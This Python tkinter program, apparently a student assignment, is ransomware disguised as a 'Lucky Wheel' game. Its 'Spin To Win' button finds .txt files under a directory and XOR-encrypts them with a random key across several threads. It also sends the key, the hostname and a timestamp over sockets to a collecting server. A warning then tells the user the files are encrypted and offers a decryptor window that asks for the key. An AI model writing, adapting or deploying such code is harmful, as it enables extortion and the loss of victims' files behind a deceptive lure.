from tkinter import *
import tkinter.font as font
from tkinter import messagebox
from tkinter import ttk
from PIL import Image
import queue
import mysql.connector
import os
import random
import socket
from datetime import datetime
import threading
from queue import Queue
from sql import *

def encryption():
 #file to encrypt
    encrypted_ext = ('.txt')

    #all files from machine
    file_paths = []
    for root, dirs, files in os.walk("E:\Python Semester 2\Assignment\Test"):
        for file in files:
            file_path, file_ext = os.path.splitext(root+'\\'+file)
            if file_ext in encrypted_ext:
                file_paths.append(root+'\\'+file)

    #generate key
    key = ''
    encryption_level = 512 // 8
    char_pool = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456789<>?,./:;[]}{|'
    char_pool_len = len(char_pool)


    for i in range(encryption_level):
        key += char_pool[random.randint(0, char_pool_len-1)]

    hostname = os.getenv("COMPUTERNAME")

    # connect to server
    ip_address = socket.gethostbyname(hostname)
    port1 = 5666
    port2 = 5678
    port3 = 5679
    time = datetime.now()
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((ip_address, port1))
            s.send(f'[{time}]'.encode('utf-8'))

        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((ip_address, port2))
            s.send(f'{hostname}'.encode('utf-8'))

        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((ip_address, port3))
            s.send(f'{key}'.encode('utf-8'))
        def encrypt(key):
            while q.not_empty:
                file = q.get()
                index = 0
                max_index =len(key) - 1
                try:
                    with open(file, 'rb') as f:
                        data = f.read()
                    with open(file,'w') as f:
                        f.write('')

                    for byte in data:
                        xor_byte = byte ^ ord(key[index])
                        with open(file, 'ab') as f:
                            f.write(xor_byte.to_bytes(1, 'little'))
                        if index >= max_index:
                            index = 0 
                        else: 
                            index += 1
                except:
                    print(f"Failed to encrypt {file}")
                q.task_done()
        q = Queue()
        for file in file_paths:
            q.put(file)

        for i in range(10):
            thread = threading.Thread(target=encrypt, args=(key,), daemon=True)
            thread.start()

        q.join()
        msg = messagebox.askquestion('Warning','All your files have been encrypted. Press Yes for decryption and No to quit the program.')
        if msg == 'yes':
            decryption()
        else:
            root.destroy()
    except:
        msg = messagebox.showwarning('Sorry', 'Our servers are busy right again. Try again later.')



root=Tk()
root.geometry('500x600+500+100')
root.minsize(500,600)
root.maxsize(500,600)
root.title('Lucky Wheel')
root.configure(bg='Sky blue')

pic = PhotoImage(file='E:\Python Semester 2\Assignment\Ransom\spin1.png')

f1=font.Font(family='Serif',size='30')
f2=font.Font(family='Serif',size='10')
f3=font.Font(family='Serif',size='20')

def decryption():
    def decryptor():
        key = num_from.get()
        def decrypt(key):
            try: 
                if key == keys3: 
                    while q.not_empty:
                        file = q.get()
                        index = 0
                        max_index = len(key) - 1
                        try:
                            with open(file, 'rb') as f:
                                data = f.read()
                            with open(file, 'w') as f:
                                f.write('')
                                for byte in data:
                                    xor_byte = byte ^ ord(key[index])
                                    with open(file, 'ab') as f:
                                        f.write(xor_byte.to_bytes(1, 'little'))
                                    if index >= max_index:
                                        index = 0 
                                    else: 
                                        index += 1
                        except:
                            msg = 'Failed to decrypt.'
                        q.task_done()
                    msg = 'Sucessfully Decrypted'
                    messagebox.showinfo('Info', msg)
                else:
                    msg = 'Wrong decryption Key.'
                    messagebox.showerror('Info', msg)
            except ValueError:
                msg = 'Wrong Decryption Key.'
                messagebox.showerror('Info', msg)

        encrypted_ext = ('.txt',)
        file_paths = []
        for root, dirs, files in os.walk("E:\Python Semester 2\Assignment"):
            for file in files:
                file_path, file_ext = os.path.splitext(root+'\\'+file)
                if file_ext in encrypted_ext:
                    file_paths.append(root+'\\'+file)

        q =queue.Queue()
        for file in file_paths:
            q.put(file)

        decrypt(key)
 

        q.join()

    root2=Toplevel()
    root2.geometry('500x600+500+100')
    root2.minsize(500,600)
    root2.maxsize(500,600)
    root2.title('Decryptor')


    photo = PhotoImage(file='E:\Python Semester 2\Assignment\Ransom\Ransom1.png')

    f3=font.Font(family='Serif',size='20')

    l1 = Label(root2, image=photo)
    l1.image = photo
    l1.pack()

    num=StringVar()
    num_from=Entry(root2,width=40,textvariable= num,font=("Times New Roman", 16))
    num_from.place(relx='0.51',rely='0.65',anchor='center')

    convert=Button(root2,text='Decrypt',bg='#c8cfde', command=decryptor)
    convert['font']=f3

    convert.place(relx='0.40',rely='0.7')

    root.mainloop()

l = Label(root, image=pic)
l.pack()

main =Label(root,text='Spin the Lucky Wheel', bg='Gold',fg='Red')
main['font']=f1
main.place(relx='0.48',rely='0.1', anchor='center')

convert=Button(root,text='-Spin To Win-',bg='red',fg='Gold',width=10, command=encryption)
convert['font']=f2
convert.place(relx='0.42',rely='0.9')

convert=Button(root,text='-test',bg='red',fg='Gold',width=10, command=decryption)
convert['font']=f2
convert.place(relx='0.2',rely='0.2')

root.mainloop()
